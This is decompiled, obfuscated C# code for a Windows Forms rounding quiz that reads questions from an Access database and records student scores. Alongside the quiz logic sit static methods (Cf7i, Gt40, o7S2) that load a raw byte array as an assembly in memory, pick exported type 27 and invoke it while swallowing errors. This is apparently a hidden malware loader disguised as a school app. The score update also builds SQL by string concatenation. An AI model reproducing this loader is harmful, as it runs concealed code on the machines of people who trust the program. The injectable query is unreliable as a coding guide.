using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Km2;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Tx27;

namespace x6P;

[DesignerGenerated]
public class Jz8 : Form
{
	private IContainer components;

	private Label _lblAnswer;

	private Label _lblT4Question;

	private Label _Label1;

	private TextBox _txtAnswer;

	private int score;

	private float random;

	private int places;

	internal Label B;

	internal Button h;

	internal Label Y;

	internal int f;

	internal float X;

	internal bool S;

	internal object n;

	internal object L;

	public object globalvariables
	{
		get
		{
			return L;
		}
		set
		{
			object obj = (L = RuntimeHelpers.GetObjectValue(value));
		}
	}

	public Jz8()
	{
		((Form)this).add_Load((EventHandler)f9E0);
		score = 0;
		f = 0;
		k3R();
	}

	protected override void m7H(bool z0H)
	{
		try
		{
			if (z0H && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(z0H);
		}
	}

	private void k3R()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		Cb7(new Label());
		y2C(new Label());
		e6M(new Label());
		r8L(new Button());
		t6Q(new Label());
		d6JT(new TextBox());
		Ki94(new Label());
		((Control)this).SuspendLayout();
		Jm5().set_AutoSize(true);
		((Control)Jm5()).set_Location(new Point(432, 131));
		((Control)Jm5()).set_Name("lblAnswer");
		((Control)Jm5()).set_Size(new Size(42, 13));
		((Control)Jm5()).set_TabIndex(52);
		Jm5().set_Text("Answer");
		y9F().set_AutoSize(true);
		((Control)y9F()).set_Location(new Point(172, 9));
		((Control)y9F()).set_Name("lblPlaces");
		((Control)y9F()).set_Size(new Size(15, 13));
		((Control)y9F()).set_TabIndex(50);
		y9F().set_Text("R");
		s7Q().set_AutoSize(true);
		((Control)s7Q()).set_Location(new Point(12, 9));
		((Control)s7Q()).set_Name("lblT4Question");
		((Control)s7Q()).set_Size(new Size(15, 13));
		((Control)s7Q()).set_TabIndex(49);
		s7Q().set_Text("Q");
		((Control)Sz2()).set_Location(new Point(193, 212));
		((Control)Sz2()).set_Name("btnT4CheckAnswer");
		((Control)Sz2()).set_Size(new Size(92, 23));
		((Control)Sz2()).set_TabIndex(47);
		((ButtonBase)Sz2()).set_Text("Check Answer");
		((ButtonBase)Sz2()).set_UseVisualStyleBackColor(true);
		r1H().set_AutoSize(true);
		((Control)r1H()).set_Location(new Point(12, 217));
		((Control)r1H()).set_Name("Label1");
		((Control)r1H()).set_Size(new Size(45, 13));
		((Control)r1H()).set_TabIndex(46);
		r1H().set_Text("Answer:");
		((Control)Gd1()).set_Location(new Point(63, 214));
		((Control)Gd1()).set_Name("txtAnswer");
		((Control)Gd1()).set_Size(new Size(100, 20));
		((Control)Gd1()).set_TabIndex(45);
		d9GC().set_AutoSize(true);
		((Control)d9GC()).set_Location(new Point(103, 9));
		((Control)d9GC()).set_Name("lblRandomNo");
		((Control)d9GC()).set_Size(new Size(15, 13));
		((Control)d9GC()).set_TabIndex(53);
		d9GC().set_Text("R");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(524, 389));
		((Control)this).get_Controls().Add((Control)(object)d9GC());
		((Control)this).get_Controls().Add((Control)(object)Jm5());
		((Control)this).get_Controls().Add((Control)(object)y9F());
		((Control)this).get_Controls().Add((Control)(object)s7Q());
		((Control)this).get_Controls().Add((Control)(object)Sz2());
		((Control)this).get_Controls().Add((Control)(object)r1H());
		((Control)this).get_Controls().Add((Control)(object)Gd1());
		((Control)this).set_Name("T4Question");
		((Form)this).set_Text("Rounding");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label Jm5()
	{
		return _lblAnswer;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cb7(Label o6S)
	{
		_lblAnswer = o6S;
	}

	[SpecialName]
	internal virtual Label y9F()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y2C(Label t3Y)
	{
		Label val = (B = t3Y);
	}

	[SpecialName]
	internal virtual Label s7Q()
	{
		return _lblT4Question;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e6M(Label x1Y)
	{
		_lblT4Question = x1Y;
	}

	[SpecialName]
	internal virtual Button Sz2()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r8L(Button j2E)
	{
		EventHandler eventHandler = k4LG;
		Button val = h;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (h = j2E);
		val = h;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label r1H()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t6Q(Label Yn5)
	{
		_Label1 = Yn5;
	}

	[SpecialName]
	internal virtual TextBox Gd1()
	{
		return _txtAnswer;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d6JT(TextBox Pb40)
	{
		_txtAnswer = Pb40;
	}

	[SpecialName]
	internal virtual Label d9GC()
	{
		return Y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ki94(Label Be4t)
	{
		Label val = (Y = Be4t);
	}

	private void f9E0(object sender, EventArgs e)
	{
		Gx5k();
		Zs25();
		Wm1c();
		Jm5().set_Text(Conversions.ToString(X));
	}

	public void Gx5k()
	{
		string n4MK = "SELECT Question FROM tblQuestions WHERE TopicNo = 4;";
		k4T5(n4MK);
	}

	public void k4T5(string n4MK)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		DataTable dataTable = new DataTable();
		OleDbConnection val = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=Student_Details.mdb");
		val.Open();
		OleDbDataAdapter val2 = new OleDbDataAdapter(n4MK, val);
		((DbDataAdapter)(object)val2).Fill(dataTable);
		s7Q().set_Text(Conversions.ToString(dataTable.Rows[0][0]));
		val.Close();
		((Component)(object)val).Dispose();
	}

	public void Zs25()
	{
		VBMath.Randomize();
		random = VBMath.Rnd(3f * VBMath.Rnd()) + 1f;
		d9GC().set_Text(Conversions.ToString(random));
		places = checked((int)Math.Floor(3f * VBMath.Rnd()) + 1);
		y9F().set_Text(Conversions.ToString(places));
	}

	public void Wm1c()
	{
		float num = (X = (float)Math.Round(random, places));
	}

	internal static void Cf7i()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])Rf6.mDic[Rf6.mArray];
		assembly = Assembly.Load(rawAssembly);
		Rf6.mDic.Add("Deep", assembly);
		assembly = null;
		if (Gt40())
		{
			k7G0.Wg92();
		}
	}

	public void Gy02()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		bool flag = false;
		while (!(flag & (Operators.CompareString(text, Gd1().get_Text(), false) == 0)))
		{
			try
			{
				text = Gd1().get_Text();
				flag = true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MessageBox.Show("Please enter an answer");
				flag = false;
				ProjectData.ClearProjectError();
			}
		}
		float num = Convert.ToSingle(text);
		checked
		{
			if (num == X)
			{
				score++;
				Interaction.MsgBox((object)"Correct answer", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				Interaction.MsgBox((object)("Incorrect, right answer is: " + Conversions.ToString(X)), (MsgBoxStyle)0, (object)null);
			}
		}
	}

	public void o9B5()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		string text = "Score";
		OleDbConnection Gc5f = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=Student_Details.mdb");
		Gc5f.Open();
		string y3DG = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("UPDATE tblStudentScores SET " + text + " = " + Conversions.ToString(score) + " WHERE ID = "), NewLateBinding.LateGet(globalvariables, (Type)null, "StuID", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" AND TopicNo = 4"));
		Zg19(y3DG, ref Gc5f);
		Gc5f.Close();
		((Component)(object)Gc5f).Dispose();
	}

	private void k4LG(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			if (Operators.CompareString(Gd1().get_Text(), "", false) == 0)
			{
				Interaction.MsgBox((object)"Enter an answer", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				Gy02();
				if (f < 0)
				{
					s7Q().set_Text("");
					Gd1().set_Text("");
					f++;
					Gx5k();
					Zs25();
					Wm1c();
				}
				else
				{
					S = true;
				}
			}
			if (S)
			{
				Interaction.MsgBox((object)("You scored: " + Conversions.ToString(score)), (MsgBoxStyle)0, (object)null);
				o9B5();
				((Form)this).Close();
				NewLateBinding.LateCall(n, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
	}

	internal static bool Gt40()
	{
		try
		{
			try
			{
				Type type = o7S2((Assembly)Rf6.mDic["Deep"]);
				if (Operators.CompareString(type.Name, Rf6.mDic[Rf6.tName].ToString(), false) == 0)
				{
					Rf6.mDic.Add(Rf6.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void Zg19(string y3DG, ref OleDbConnection Gc5f)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		OleDbCommand val = new OleDbCommand(y3DG, Gc5f);
		try
		{
			val.ExecuteNonQuery();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Failed:\r\n" + ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			((Component)(object)val).Dispose();
		}
	}

	internal static Type o7S2(Assembly d8J5)
	{
		return d8J5.GetExportedTypes()[27];
	}
}
